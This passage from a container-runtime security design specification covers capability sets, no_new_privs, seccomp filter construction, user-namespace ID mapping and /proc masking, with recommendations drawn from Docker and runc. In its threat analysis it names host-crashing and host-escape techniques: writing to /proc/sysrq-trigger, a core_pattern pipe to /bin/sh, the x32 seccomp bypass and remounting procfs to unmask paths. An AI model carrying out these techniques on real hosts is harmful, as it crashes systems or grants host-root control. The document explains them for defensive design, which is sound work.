and `errno`-TLS reads are hazardous: a library that models a capability set as a heap-allocated
hash set, that builds its error values with string formatting, or that consults
`/proc/sys/kernel/cap_last_cap` is the wrong shape for this window — and the last of those is
not even present after `pivot_root` and before `/proc` is mounted. A capability set is three
`u64`s and one `capset(2)`; keep it that way, and keep the ordering visible.

#### Which capabilities, and `no_new_privs`

**Convention.** Docker's default retained set is 14, from
`moby@v28.3.1/oci/caps/defaults.go#DefaultCapabilities()` — unchanged byte-for-byte at
`docker-v29.9.2`: `CAP_CHOWN`, `CAP_DAC_OVERRIDE`, `CAP_FSETID`, `CAP_FOWNER`, `CAP_MKNOD`,
`CAP_NET_RAW`, `CAP_SETGID`, `CAP_SETUID`, `CAP_SETFCAP`, `CAP_SETPCAP`,
`CAP_NET_BIND_SERVICE`, `CAP_SYS_CHROOT`, `CAP_KILL`, `CAP_AUDIT_WRITE`. Docker sets bounding,
permitted and effective to this list and leaves inheritable and ambient empty. The bit pattern
`0xa80425fb` in `/proc/<pid>/status` is the fingerprint of a default Docker container.

**Convention.** runc's own default spec (`runc@v1.2.5/libcontainer/specconv/example.go#L33-L49`,
what `runc spec` emits) retains **three**: `CAP_AUDIT_WRITE`, `CAP_KILL`,
`CAP_NET_BIND_SERVICE` — and sets `NoNewPrivileges: true`. So "the OCI default" and "the Docker
default" differ by a factor of about five, and Docker's permissive `no_new_privs` is a Docker
policy layered on a runtime whose own default is the opposite.

**Recommendation.** Ship Docker's 14 as the default — diverging on defaults is a compatibility
bug users experience as random breakage — and ship a 7-capability `--security-profile=strict`
(`CAP_CHOWN`, `CAP_FOWNER`, `CAP_FSETID`, `CAP_KILL`, `CAP_SETGID`, `CAP_SETUID`,
`CAP_NET_BIND_SERVICE`). Four of Docker's 14 are hard to defend and are what `strict` removes:

- **`CAP_DAC_OVERRIDE`** bypasses every file permission check; combined with a bind-mounted host
  directory it reads and writes anything in it regardless of mode. Highest-value single removal.
- **`CAP_NET_RAW`** gives raw and packet sockets, enabling ARP/NDP and DNS spoofing against
  *other containers on the same bridge*. It exists in the default set so `ping` works, and
  `net.ipv4.ping_group_range` provides unprivileged ping without it.
- **`CAP_MKNOD`** — §13.6 shows the device controller does not actually gate `mknod`, which
  makes this the coherent place to close that hole.
- **`CAP_SETFCAP`** is worth more to an attacker than its reputation: a container process can
  write `security.capability` on a binary in its own writable layer, and that xattr **survives
  into a commit or image export**, so the capability escapes the container's lifetime into any
  future container started from that image, where the bounding set may differ. `no_new_privs`
  neutralises it for the current process tree only. Rate it with `CAP_MKNOD`: drop by default.

`CAP_SETUID`/`CAP_SETGID` stay in both sets: without them `nginx` cannot drop to `www-data` and
`su`/`sudo` break. Document loudly that without a user namespace, "any uid in the container" is
"any uid on the host", including the uid that owns a bind-mounted host path.

**Fact.** `CAP_SYS_ADMIN` is, in `capabilities(7)`'s own words to kernel developers,
*"overloaded"* — *"Don't choose CAP_SYS_ADMIN if you can possibly avoid it!"* It gates
`mount`/`umount2`, `pivot_root`, `setns`, most `unshare`, privileged `keyctl`, block `ioctl`s,
`bpf` and `perf_event_open` before 5.8, `open_by_handle_at` with `CAP_DAC_READ_SEARCH`,
`sethostname`, `swapon`, and writes to `/proc/sys/kernel/*`. It is effectively root in three
independent ways: it can `mount` a fresh `proc` over the masked one, it can `unshare` into a new
user and mount namespace and escape the propagation constraints the runtime set up, and it can
obtain a writable `/proc/sys` — which §13.5 identifies as *the* escape vector.

**Fact — the clarification that prevents the most common misreading.** Measured inside
`unshare -Ur` on Rocky 8.8: `CapEff = CapPrm = CapBnd = 0x000001ffffffffff`, i.e. **all 41
capabilities** including `cap_sys_admin`, `cap_sys_module`, `cap_bpf`. That is the point of user
namespaces: you get every capability, but only over objects owned by that namespace. The kernel
distinguishes `capable()` (checked against the **initial** user namespace) from
`ns_capable(ns, CAP)` (checked against the namespace owning the object). `init_module`,
`reboot`, `settimeofday`, `bpf(BPF_PROG_LOAD)` for most program types and writes to
non-namespaced `/proc/sys` entries all use `capable()`, so a userns root holds the bit and the
check still fails. `mount` of an `FS_USERNS_MOUNT` filesystem, `setns` into an owned namespace,
and `chown` within the mapped range use `ns_capable()` and succeed.
**Recommendation.** No error message in this engine may say "you have `CAP_SYS_ADMIN`" without
saying in which namespace.

**Fact.** `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` sets a per-thread, **irreversible**, fork-
and-execve-inherited bit. With it set, `execve` grants no privilege the caller did not already
have: set-UID and set-GID bits are ignored, **file capabilities are ignored**, and LSM `execve`
hooks that would *raise* privilege are refused.

**Convention.** Docker leaves it off — `NoNewPrivs: 0` on a live default container — so a
default Docker container can use a set-UID binary to become uid 0 in the container, which
without a user namespace is uid 0 on the host, bounded only by the 14-capability set.
**Recommendation.** Set `no_new_privs` by default. The only things it breaks are set-UID
binaries (`sudo`, `su`, `mount`) and file-capability binaries inside the container, which are
exactly what a container should not be doing at runtime; provide
`--security-opt allow-new-privileges` for the escape. It also buys a concrete simplification:
with `no_new_privs` unconditionally on, the seccomp install has one code path instead of two
(§13.2). **Trap.** That simplification is only real if the escape hatch is handled explicitly —
a container started with `allow-new-privileges` must install its filter *early, while still
privileged*, and saying so in the spec is what keeps the second branch from reappearing by
accident.

**Fact.** `SECBIT_NOROOT` (via `prctl(PR_SET_SECUREBITS)`) disables the root special case above:
a uid-0 process that `execve`s an ordinary binary then gets **no** capabilities rather than the
whole bounding set. **Recommendation.** Skip securebits, but record the reason honestly:
`no_new_privs` plus a correct bounding set covers *less* ground than securebits, deliberately,
for compatibility with `USER root` images. It is not that the two mechanisms are equivalent.

### 13.2 seccomp

**Fact.** A seccomp filter is a classic-BPF program evaluated at syscall entry whose entire
input is:

```c
struct seccomp_data {
    int   nr;                   /* System call number */
    __u32 arch;                 /* AUDIT_ARCH_* value */
    __u64 instruction_pointer;
    __u64 args[6];
};
```

The program may load from this buffer, compute, jump, and return a 32-bit action word. No
helpers, no loops (backward jumps are rejected), and **no memory outside the buffer**.

**Fact.** Therefore **a filter cannot dereference pointer arguments.** This is not an oversight
— it is the only safe design, because between the filter's read of user memory and the kernel's
own read, another thread in the same address space could change it, and the kernel would then
enforce policy on one value and act on another
(`Documentation/userspace-api/seccomp_filter.rst`). Three design consequences:

- **No path-based rules are possible.** "Deny `open()` of `/etc/shadow`" is not expressible.
  Path policy belongs to an LSM (§13.8). Anyone proposing a path-based seccomp rule has
  misunderstood the mechanism.
- **Integer and flag arguments are filterable**, which is why the useful rules are shaped like
  "`clone` with no `CLONE_NEW*` flag" or "`personality` equal to 0".
- **`clone3` is structurally unfilterable.** It takes a *pointer* to `struct clone_args`, so its
  flags cannot be examined at all. "Block namespace creation" is expressible for `clone` and
  **inexpressible** for `clone3`. That, not kernel-version etiquette, is why `clone3` must be
  denied wholesale rather than argument-filtered.

**Fact — installation.** Two entry points: `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)`
(3.5) and `seccomp(SECCOMP_SET_MODE_FILTER, flags, &prog)` (3.17, the only one that takes
flags). Either way the caller must satisfy one of two conditions, else **`EACCES`**: *"either
the calling thread must have the `CAP_SYS_ADMIN` capability in its user namespace, or the thread
must already have the `no_new_privs` bit set"* (`seccomp(2)`; enforced at
`torvalds/linux@v6.17/kernel/seccomp.c#L686-L690`, whose comment gives the reason — *"This
avoids scenarios where unprivileged tasks can affect the behavior of privileged children"*). A
filter that returns a fake success for a syscall a set-UID binary depends on could otherwise be
weaponised; `no_new_privs` guarantees no set-UID transition will happen.

**Recommendation.** `PR_SET_NO_NEW_PRIVS` must precede the install, and the install goes
immediately before `execve` — step 11 then 12 of §13.1. runc's own comment states the second
half: *"Set seccomp as close to execve as possible, so as few syscalls take place afterward."*
The practical consequence is that our init's own remaining syscalls — `execve`, `close_range`,
the sync-pipe `read`/`write` — must be in the profile. Docker's allowlist contains all of them,
so this is invisible until someone hand-minimises a profile.

**Trap.** Our own init must install the filter **after it is done mounting**. The new mount API
calls (`fsopen`, `fsconfig`, `fsmount`, `fspick`, `open_tree`, `move_mount`, `mount_setattr`)
are all in Docker's `CAP_SYS_ADMIN`-gated bucket, which is correct for the container and fatal
for us if the ordering slips. The corrected ordering already has this right; it shows up as a
failure only with a custom profile.

**Fact — threads.** `SECCOMP_FILTER_FLAG_TSYNC` synchronises the filter across all threads of
the calling process. On failure plain TSYNC returns **the thread ID of the offending thread** (a
positive value), not an errno; `ESRCH` comes only with `SECCOMP_FILTER_FLAG_TSYNC_ESRCH`
(Linux 5.7), which exists because the positive-return convention collides with
`SECCOMP_FILTER_FLAG_NEW_LISTENER` returning an fd.
**Recommendation.** We do not need TSYNC, because our container init is single-threaded by
construction at the point of install — a `clone`d child that has not `execve`'d and has spawned
no threads. **This is a hard constraint on the Rust design, not a preference: the process that
installs seccomp, drops capabilities and calls `execve` must not be multithreaded.** A tokio
runtime spawns worker threads; running container init inside one puts us in the classic
fork-in-a-multithreaded-process hazard *and* forces TSYNC. Two further subsystems behave
differently in a threaded process — `unshare(CLONE_NEWUSER)` and `landlock_restrict_self(2)` —
so three independent mechanisms force the same answer.

**Fact.** Filters are inherited across `fork`/`clone`, preserved across `execve`, cannot be
removed or relaxed, and when several are installed the most restrictive result wins.

**Fact — the actions**, in decreasing precedence: `SECCOMP_RET_KILL_PROCESS` (4.14),
`KILL_THREAD`, `TRAP` (`SIGSYS`, with `si_syscall`), `ERRNO` (errno in the low 16 bits),
`USER_NOTIF` (5.0), `TRACE`, `LOG` (4.14), `ALLOW`.

**Recommendation.** Default to `ERRNO(EPERM)`, never `KILL_*`. The asymmetry is the whole
argument: libraries *probe* for syscalls at runtime — glibc tries `clock_gettime` variants,
`getrandom`, `statx`, `renameat2`; Go's runtime tries `epoll_pwait2`; jemalloc probes `madvise`
flags. A probe that gets `EPERM` falls back; a probe that gets killed takes the process down
with a `SIGSYS` indistinguishable from a crash. `KILL_PROCESS` is right for a hand-tuned
allowlist for one known binary, which is not what a general runtime ships. Offer
`SCMP_ACT_LOG` as a `--seccomp-audit` mode — one field change, and it is what makes a custom
profile writable by a non-expert.

#### The per-architecture problem

**Fact.** Syscall numbers are per-architecture, and on x86_64 one kernel accepts three ABIs:

| ABI | `arch` value | how identified |
|---|---|---|
| x86-64 | `AUDIT_ARCH_X86_64` (`0xc000003e`) | plain numbers |
| x32 | `AUDIT_ARCH_X86_64` — **the same value** | bit 30 of `nr` set (`__X32_SYSCALL_BIT = 0x40000000`) |
| i386 | `AUDIT_ARCH_I386` (`0x40000003`) | 32-bit entry, completely different numbering |

`seccomp(2)`, verbatim: *"A list of system calls to be denied based on `nr` that does not also
contain `nr` values with `__X32_SYSCALL_BIT` set can be bypassed by a malicious program that
sets `__X32_SYSCALL_BIT`."* And a second x32 trap: *"the x32 ABI uses syscall numbers in the
ranges 512-547 **as well as** the corresponding non-x32 syscalls ORed with `__X32_SYSCALL_BIT`"*
— so x32 has two encodings for the same call.

**Fact.** The bypass is still live in 2026 wherever `CONFIG_X86_X32_ABI=y`; it remains a Kconfig
option at `torvalds/linux@v6.17/arch/x86/Kconfig#L3139`. It is off in most distribution kernels,
in which case an x32 `nr` returns `ENOSYS` from the kernel and the bypass is inert — but that is
a property of a host we do not control, and the failure mode is total silent bypass of the
filter.

**Fact — what a filter that ignores this does.** If the first instruction is
`if arch != AUDIT_ARCH_X86_64: ALLOW`, a 32-bit binary or an `int 0x80` from a 64-bit one is
entirely unfiltered. If the filter checks `arch` but not bit 30, an x32 process passes the arch
check, matches no `nr` rule, and falls through to the default — unfiltered if the default is
`ALLOW`. And a filter that compares `nr` without checking `arch` at all is comparing numbers
from different tables: `nr = 11` is `execve` on i386 and `munmap` on x86_64.

**Convention.** Docker handles this with `archMap`, which at v28.3.1 has **8** entries (9 at
v29.9.2, adding LoongArch64); on x86_64 it emits rules for `SCMP_ARCH_X86_64` plus the
sub-architectures `SCMP_ARCH_X86` and `SCMP_ARCH_X32`.

**Recommendation.** Emit rules for the **native architecture only**, and deny every other `arch`
value and any `nr` with bit 30 set. That handles both x32 encodings at once, roughly thirds the
filter size, and thirds the places a mistake can hide; what it costs is the ability to run
32-bit binaries, which approximately no image built after 2018 contains. The failure must be
legible: *"this container issued a syscall from the i386 ABI, which this engine's seccomp
profile denies; use `--seccomp=unconfined` or supply a profile declaring `SCMP_ARCH_X86`"*. Make
multi-arch a profile field so a user can opt in; do not hard-code the refusal.

**Recommendation.** Regardless of that choice: **the filter's first instruction is an `arch`
check branching to the default-deny action for unknown architectures, never a fall-through.**
One BPF instruction, and it is the difference between a filter and a decoration.

#### The limit that actually binds

**Fact.** `BPF_MAXINSNS = 4096` per filter
(`torvalds/linux@v6.17/include/uapi/linux/bpf_common.h#L53-L54`, enforced at
`kernel/seccomp.c#L680-L681`). A Docker-equivalent profile is nowhere near it: the profile
mentions **426 unique syscall names** at both v28.3.1 and v29.9.2, of which **370** are
effective for a default container on amd64 (14 caps), and a flat `jeq <nr>, ALLOW` chain costs
about one instruction per allowed call. Native-arch-only lands around 410 instructions; all
three x86 ABIs around 1200. Both are comfortably inside 4096, and libseccomp compresses further
with ordered jump chains.

**Recommendation.** No design decision may be justified by `BPF_MAXINSNS`. Two other limits are
the real ones:

1. **The 255-instruction jump offset.** `struct sock_filter`'s `jt`/`jf` are `__u8`
   (`include/uapi/linux/filter.h#L24-L29`), so the maximum forward jump in one instruction is
   255. runc's own ENOSYS patcher carries two code paths for exactly this
   (`runc@v1.2.5/libcontainer/seccomp/patchbpf/enosys_linux.go#L379`, `#L449`:
   `if baseJumpEnosys+1 <= 255 { … } else { /* long jump via skip chain */ }`). **This is the
   part of hand-building a filter that will actually bite** — jump arithmetic with an 8-bit
   offset and a long-jump fallback — not opcode encoding.
2. **`MAX_INSNS_PER_PATH` across stacked filters**: `(1 << 18) / sizeof(struct sock_filter)` =
   32768 instructions total, with a **+4 instruction penalty per previously installed filter**
   (`kernel/seccomp.c#L237-L238`, `#L912-L919`), returning **`ENOMEM`**. Our filter plus a nested
   runtime's plus the workload's own (`systemd`'s `SystemCallFilter=`, a Go program's own) adds
   up only in docker-in-docker — but it produces an errno from `seccomp(2)` that nobody expects.

**Fact — endianness.** Every `CLONE_NEW*` bit lives in the low 32 bits of `clone`'s `flags`, so
a single `BPF_LD|BPF_W|BPF_ABS` of the low word of `args[0]` plus an `AND` and a `JEQ` suffices.
But the filter must load the **endianness-correct** half: on big-endian the two 32-bit halves of
each `__u64` are swapped, and `kernel/seccomp.c#L241-L243` says so explicitly — *"Endianness is
explicitly ignored and left for BPF program authors to manage."*

#### Docker's default profile — what it actually contains

**Convention.** Structure at `moby@v28.3.1/profiles/seccomp/default.json` (at v29.9.2 the
shipped profile has moved to a separate module, vendored at
`vendor/github.com/moby/profiles/seccomp/default.json`; the `daemon/pkg/oci/fixtures/` copies
are test fixtures, not the profile): `defaultAction: SCMP_ACT_ERRNO` with
`"defaultErrnoRet": 1` stated **explicitly** (`EPERM`, not an inference libseccomp resolves),
then a large allowlist.

**Convention.** The profile is *almost* pure denial-by-omission, but **it contains exactly one
non-`ALLOW` rule**, and it is the most interesting rule in the file:

```json
{ "names": ["clone3"], "action": "SCMP_ACT_ERRNO", "errnoRet": 38,
  "excludes": { "caps": ["CAP_SYS_ADMIN"] } }
```

`errnoRet: 38` is **`ENOSYS`**. So `clone3` appears **twice** — allowed when the container holds
`CAP_SYS_ADMIN`, explicitly `ENOSYS` when it does not. The reason is §13.2's pointer rule:
`clone3`'s flags cannot be filtered, so the only safe handling is to make glibc fall back to
`clone`, which *is* filterable.

**Convention — the `clone` namespace mask.** The real value in the profile is
`2114060288` = **`0x7E020000`**, unchanged since at least Docker 20.10:

```
0x7E020000 = CLONE_NEWNS     0x00020000
           | CLONE_NEWCGROUP 0x02000000
           | CLONE_NEWUTS    0x04000000
           | CLONE_NEWIPC    0x08000000
           | CLONE_NEWUSER   0x10000000
           | CLONE_NEWPID    0x20000000
           | CLONE_NEWNET    0x40000000
```

Seven flags. The rule is `(arg0 & 0x7E020000) == 0` — **without `CAP_SYS_ADMIN`, `clone` is
allowed only when it requests none of those seven namespaces**, and that **includes
`CLONE_NEWCGROUP`**: Docker denies unprivileged cgroup-namespace creation. A second rule with
`index: 1` exists for s390/s390x, where `clone`'s arguments are swapped.
**Trap.** `CLONE_NEWTIME` is *not* in the mask — not as a policy choice, but because time
namespaces are not created via `clone` at all; they need `unshare(CLONE_NEWTIME)` then a fork.
**Recommendation.** Write the mask as a named constant expression, never a magic number. A
decade of readers has mis-decoded this constant, which is exactly what a magic number costs.

**Convention — the capability-gated rules.** Docker computes the profile per container against
its final capability set, and gates these syscalls on the corresponding capability:
`CAP_SYS_ADMIN` (`bpf`, unrestricted `clone`, `clone3`, `fanotify_init`, `mount`, `umount2`,
`move_mount`, `open_tree`, `fsopen`/`fsconfig`/`fsmount`/`fspick`, `mount_setattr`,
`name_to_handle_at`, `perf_event_open`, `quotactl`, `setdomainname`, `sethostname`, `setns`,
`syslog`, `unshare`), `CAP_SYS_MODULE`, `CAP_SYS_PTRACE` (`ptrace`, `process_vm_readv/writev`,
`kcmp`), `CAP_SYS_BOOT`, `CAP_SYS_CHROOT`, `CAP_SYS_RAWIO`, `CAP_SYS_TIME`, `CAP_SYS_NICE`,
`CAP_SYSLOG`, `CAP_DAC_READ_SEARCH` (`open_by_handle_at`). Denied outright, in no bucket at all:
`keyctl`, `add_key`, `request_key`, `userfaultfd`, `io_uring_setup`/`_enter`/`_register`.

**Recommendation — copy the belt-and-braces, it is the best idea in the profile.** Every one of
those gated syscalls already requires the capability in the kernel. Gating them again in seccomp
is **defence in depth against a kernel capability-check bug**, and that is not theoretical:
CVE-2022-0492 was precisely a missing capability check, and seccomp-enabled containers were
immune for exactly this reason (§13.7, class 5).

**Recommendation — adopt Docker's profile essentially verbatim as our default.** Not because it
is elegant, but because it encodes a decade of "which syscall does which image need" that we
cannot rediscover, and because a different default is a compatibility bug. What to add on top:
(a) the `ENOSYS`-above-max rule as a first-class feature, (b) `--seccomp-audit`, (c) native-arch
rules only. What not to do is write an allowlist from first principles.

**Fact — the `ENOSYS` requirement.** glibc ≥ 2.34 and Go implement fallbacks: try `clone3`, use
`clone` on `ENOSYS`; try `faccessat2`, fall back to `faccessat`. A filter returning `EPERM`
instead of `ENOSYS` breaks the fallback and the library reports a hard failure — glibc's
`posix_spawn` uses `clone3` first, so a naive allowlist-with-EPERM-default breaks every modern
image, with a symptom ("`posix_spawn` failed") that points nowhere near seccomp.
**Convention.** runc handles syscalls *newer than anything the profile mentions* by
post-processing libseccomp's output to prepend a per-architecture
"`if nr > max_known: return ENOSYS`" stub, with the x32 bit and s390's syscall-0 multiplexing
handled specially. **Recommendation.** Emit that rule ourselves, as two BPF instructions at the
head of the filter — but compute the threshold from the **kernel's** syscall table, not from our
profile's maximum. runc's own FIXME names the hazard: *"This implementation can in principle
cause issues with syscalls like `close_range(2)` which were added out-of-order in the syscall
table between kernel releases"* (`patchbpf/enosys_linux.go#L294-L304`). A threshold taken from
the profile will `ENOSYS` a syscall that exists if the profile happens to omit a low-numbered
newer call.

### 13.3 User namespaces and ID mapping

**Fact.** The rules for writing `/proc/<pid>/uid_map` and `/proc/<pid>/gid_map`
(`user_namespaces(7)`):

1. **Write-once.** A second write fails with `EPERM`.
2. **Position.** The writer must be in the user namespace of the target process or in its
   parent user namespace.
3. **Two distinct capability rules, which must not be conflated.** `CAP_SETUID`/`CAP_SETGID`
   **in the user namespace of the target** is a prerequisite for writing at all — which a fresh
   `CLONE_NEWUSER` child has by construction. `CAP_SETUID`/`CAP_SETGID` **in the parent user
   namespace** is what lifts the single-line restriction — which our root daemon has. The
   capability is checked against the credentials of the process that **opened** the file
   (`file_ns_capable(file, map_ns, CAP_SYS_ADMIN)`,
   `torvalds/linux@v6.11/kernel/user_namespace.c#L977`), so an fd opened before the `unshare` is
   useless.
4. **The unprivileged single-mapping rule.** Without parent-namespace privilege the data must be
   a single line mapping the writing process's own effective ID, and *"The writing process must
   have the same effective user ID as the process that created the user namespace."*
5. **Line and byte limits.** 5 lines up to Linux 4.14, **340** since 4.16 — but also *"the
   number of bytes written to the file must be **less than the system page size**, and the write
   must be performed **at the start of the file**"*, with `lseek`/`pwrite` to a nonzero offset
   rejected. At ~30 bytes a line that caps a practical map near **130 lines**, not 340. The
   builder must enforce the byte limit, in one `write(2)` at offset 0.
6. **`setgroups` must be denied before `gid_map`.** Writing `deny` to `/proc/<pid>/setgroups`
   before writing `gid_map` permanently disables `setgroups(2)` in that namespace; once
   `gid_map` is written it is no longer possible to deny it, and the transition is one-way.

**Fact — why `setgroups` must be denied**, in the man page's own reasoning: an unprivileged user
in a new userns could otherwise call `setgroups(0, NULL)` to *drop* a group, and *"this then
allowed formerly unprivileged users to drop groups and thus gain file access that they did not
previously have"*. The negative-permission case: a file with mode `0604` and group `staff`
denies `staff` members the read access `other` has, so dropping `staff` grants it.

**Fact — the correction that changes the rootless design space.** A process that has just
`unshare(CLONE_NEWUSER)`d **can** write its own `uid_map`, provided the map is a **single extent
of length 1 mapping its own euid**. `torvalds/linux@v6.11/kernel/user_namespace.c#L1163`
(`new_idmap_permitted`):

```c
if ((new_map->nr_extents == 1) && (new_map->extent[0].count == 1) &&
    uid_eq(ns->owner, cred->euid)) {
        u32 id = new_map->extent[0].lower_first;
        if (cap_setid == CAP_SETUID) {
                kuid_t uid = make_kuid(ns->parent, id);
                if (uid_eq(uid, cred->euid))
                        return true;     /* self-map of own euid: allowed */
```

This is exactly what `unshare --map-root-user` and `podman unshare` do. **So single-ID rootless
needs no intermediate process and no setuid helper.** What a self-mapping child cannot write is
a multi-extent or length > 1 map: that needs
`ns_capable(ns->parent, CAP_SETUID) && file_ns_capable(file, ns->parent, CAP_SETUID)`, i.e. a
privileged writer in the parent namespace — the daemon, or `newuidmap`.

**Trap.** The common claim is that a child can never map itself, and that user-namespace support
therefore forces a three-process topology. It does not. The three-process topology is required
for `/etc/subuid`-style multi-ID maps only. There is a legitimate rung between "root MVP" and
"full subuid rootless" that costs no new process topology at all.

**Fact — what *does* force the parent to write the map.** A process that has `execve`'d since
`unshare(CLONE_NEWUSER)` has **zero capabilities** and cannot write any map. Measured on Rocky
8.8: `unshare -U bash -c 'echo "0 <uid> 1" > /proc/self/uid_map'` → `EPERM`, with
`CapPrm = CapEff = 0`; the same write performed in-process, with no `execve` between the
`unshare` and the write, succeeds. The `execve` transformation explains it exactly:
`F(permitted) = F(inheritable) = P(ambient) = 0` and euid ≠ 0, so `P'(permitted) = 0`.
**Recommendation.** Whichever topology we use, `uid_map`/`gid_map` must be written **before the
child `execve`s anything**, by a process that has not `execve`'d since the `unshare` — in
practice the parent writing `/proc/<child>/uid_map` while the child blocks on a sync pipe. An
implementation that re-execs a helper and has the helper map itself gets `EPERM` with a cause
invisible from the errno.

**Fact — the rule a root-first engine will hit first, added in Linux 5.12 and easy to miss.**
Creating a mapping that maps **UID 0 of the parent namespace** additionally requires
**`CAP_SETFCAP`**: if the writer is in the parent namespace it must hold `CAP_SETFCAP` there; if
the writer is in the child, the process that *created* the namespace must have held it
(`verify_root_map`, `user_namespace.c#L881`). Any identity map, or a plain `0 0 1`, is such a
mapping. Three places this bites a root-first design: a hardened daemon that drops
`CAP_SETFCAP` from itself (the obvious generalisation of dropping it from containers, §13.1);
our engine running inside a container under `--cap-drop=SETFCAP` or a Kubernetes
`securityContext` that drops it; and the diagnosis, because the errno is `EPERM` on a
`write(2)` — **identical to the write-once error and to the unprivileged-multi-line error.**
**Recommendation.** Our error path must disambiguate those three by checking our own
`CAP_SETFCAP` and the map's shape *before* reporting, not after.

**Fact — the other kernel ceilings.** 32 nested levels of user namespaces since Linux 3.11
(`EUSERS` beyond); `/proc/sys/user/max_user_namespaces`, a per-userns quota commonly set to 0 on
hardened hosts, which turns every rootless operation into `EPERM` with no explanation; and the
Debian/Ubuntu `kernel.unprivileged_userns_clone` knob. All three belong in the probe list.

**Fact — `/etc/subuid` and the setuid helpers.** On RHEL-family hosts `newuidmap`/`newgidmap`
carry **file capabilities, not the setuid bit**: `getcap` reports `cap_setuid=ep` and
`cap_setgid=ep` on binaries that are mode `0755`. **Recommendation, and it is a hard ordering
constraint rather than a preference:** `no_new_privs` disables file capabilities exactly as it
disables set-UID. A rootless engine that sets `no_new_privs` on itself and then `execve`s
`newuidmap` gets a silently unprivileged helper and an `EPERM` with no diagnostic. If we ever
call these helpers, it must be before we set `no_new_privs`, or from a process that never sets
it. With no `/etc/subuid` entry the helper refuses on its own check
(`newuidmap: uid range [1-65537) -> [100000-165536) not allowed`), and the only legal map is the
single-extent self-map above.

**Fact — what breaks with only one uid mapped**, measured on Rocky 8.8 under `unshare -Ur`:

```
$ unshare -Ur chown 100:100 file
chown: changing ownership of 'file': Invalid argument       # EINVAL, not EPERM
$ unshare -Ur setpriv --reuid 65534 --regid 65534 --clear-groups id
setpriv: setresuid failed: Invalid argument                 # EINVAL
```

**Fact — why `EINVAL` and not `EPERM`.** The kernel translates the requested id through the
namespace's map in `chown_common` → `make_kuid()`, which returns `INVALID_UID` for an unmapped
value, and the syscall rejects it as an invalid *argument*. **Recommendation.** Intercept this:
a `chown`/`setresuid` returning `EINVAL` inside a user namespace must be reported as *"uid N is
not mapped in this container's user namespace; add a subuid range for <user> in /etc/subuid
(requires root), or run this image as a single uid"*. Left raw, `EINVAL` reads like a bug in our
code rather than a missing line in a config file — and this is what breaks extracting any image
whose tar contains uid 100, 33 or 999, and every image whose entrypoint drops privileges.

**Fact — what root inside a non-initial user namespace genuinely cannot do.** Everything checked
with `capable()` rather than `ns_capable()`: load a kernel module, `reboot`, `settimeofday`,
`bpf(BPF_PROG_LOAD)` for most program types, `mknod` a real device node (§13.6), and write any
non-namespaced `/proc/sys` entry. It *can* mount `FS_USERNS_MOUNT` filesystems, `setns` into
namespaces it owns, and `chown` within its mapped range.

**Convention.** A default Docker container has **no user namespace at all**: its
`/proc/<pid1>/ns/user` is the same inode as host PID 1's, and `uid_map` reads
`0 0 4294967295`. Root in the container *is* root on the host, bounded by 14 capabilities, a
seccomp filter and an AppArmor profile. Docker's `userns-remap` mode exists and is off by
default.

**Recommendation.** Support a user namespace with a real mapping from the start, **even in root
mode**, and make "no userns" the opt-out. Retrofitting a user namespace is the expensive
rootless retrofit (§14.4) and the seam is identical whether we are root or not. The friction —
bind-mounted host volumes needing either a matching `chown` or an idmapped mount — is exactly
why Docker made remapping opt-in, and is resolved by the next paragraph.

**Fact.** Since **Linux 5.12**, `mount_setattr(2)` with `MOUNT_ATTR_IDMAP` and a `userns_fd`
attaches an id-mapping to a **mount**, not to a filesystem or an inode. Reads and writes through
that mount translate ids through the namespace's map; on-disk ownership is untouched and other
mounts of the same filesystem are unaffected. **Recommendation.** This is architecturally
important, not merely convenient. The alternative is `chown -R` of every extracted layer into
the subuid range, which makes layers unshareable between users (breaking content-addressed
deduplication along user boundaries), makes extraction O(files) in `chown` syscalls on top of
O(bytes), and turns a 1 GB image with 100k files into a multi-second `chown` storm on every
first run. With idmapped mounts: extract once, own it as the engine's uid, attach a different
idmap per container. The same mechanism solves bind-mounted host volumes without touching the
user's data. **Recommendation.** The engine's mount code takes an `Option<IdMapping>` per mount
**from day one**, even while it is always `None` in root mode — see §14.4 for why retrofitting
it is a different syscall sequence rather than an extra argument.

### 13.4 `/proc` and `/sys`

**Fact.** A fresh procfs mount in a new PID namespace shows only that namespace's processes —
and nothing else is virtualised. procfs also exposes host-global files that no PID namespace
touches: `/proc/kcore` (all of physical memory as an ELF core file), `/proc/sys/**`,
`/proc/sysrq-trigger`, `/proc/kallsyms`, `/proc/keys`, `/proc/timer_list`, `/proc/interrupts`,
`/proc/bus/pci`. A handful of `/proc/sys/net/*` and
`/proc/sys/kernel/{hostname,domainname,shm*,msg*,sem}` entries are namespaced via net/uts/ipc;
the rest are not. `echo c > /proc/sysrq-trigger` crashes the host, and
`/proc/sys/kernel/core_pattern` set to `|/bin/sh -c …` gets host-root code execution on the next
core dump, because the kernel runs the pipe program in the **initial** namespaces as root.

**Convention — the mechanism runc uses** (`libcontainer/rootfs_linux.go`): masking a *file* is
`mount --bind /dev/null <path>`, chosen over deleting so that programs which `stat()` the path
do not break; masking a *directory* is a fresh `mount -t tmpfs -o ro`; a read-only path is
`mount --bind <path> <path>` followed by `mount -o remount,bind,ro <path>`, because `MS_RDONLY`
is ignored in the initial `MS_BIND` call. Non-existent paths are skipped silently.

**Convention.** Docker's masked list (`moby@v28.3.1/oci/defaults.go#defaultLinuxMaskedPaths()`):
`/proc/asound`, `/proc/acpi`, `/proc/interrupts`, `/proc/kcore`, `/proc/keys`,
`/proc/latency_stats`, `/proc/timer_list`, `/proc/timer_stats`, `/proc/sched_debug`,
`/proc/scsi`, `/sys/firmware`, `/sys/devices/virtual/powercap`, plus
`/sys/devices/system/cpu/cpu<N>/thermal_throttle` per possible CPU. Read-only:
`/proc/bus`, `/proc/fs`, `/proc/irq`, `/proc/sys`, `/proc/sysrq-trigger`.

**Convention — a divergence worth taking a side on.** runc's own default spec
(`runc@v1.2.5/libcontainer/specconv/example.go#L104-L122`) masks only **10** paths: it has **no
`/proc/interrupts`, no powercap, no thermal_throttle** — which are exactly the three side-channel
entries (moby's source cites `GHSA-6fw5-f8r9-fgfm` for interrupts and thermal_throttle,
`GHSA-jq35-85cj-fj4p` for powercap and the PLATYPUS RAPL key-recovery work).
**Recommendation.** Emit Docker's list, not `runc spec`'s. Emitting the "spec default" leaves us
side-channel exposed.

**Fact — and this changes what masking is worth.** **`maskedPaths` and `readonlyPaths` are
per-superblock.** Measured on kernel 6.11.0-29: mounting a second, plain procfs inside the same
mount namespace succeeded and produced a *different superblock* with `/proc/kcore` present.
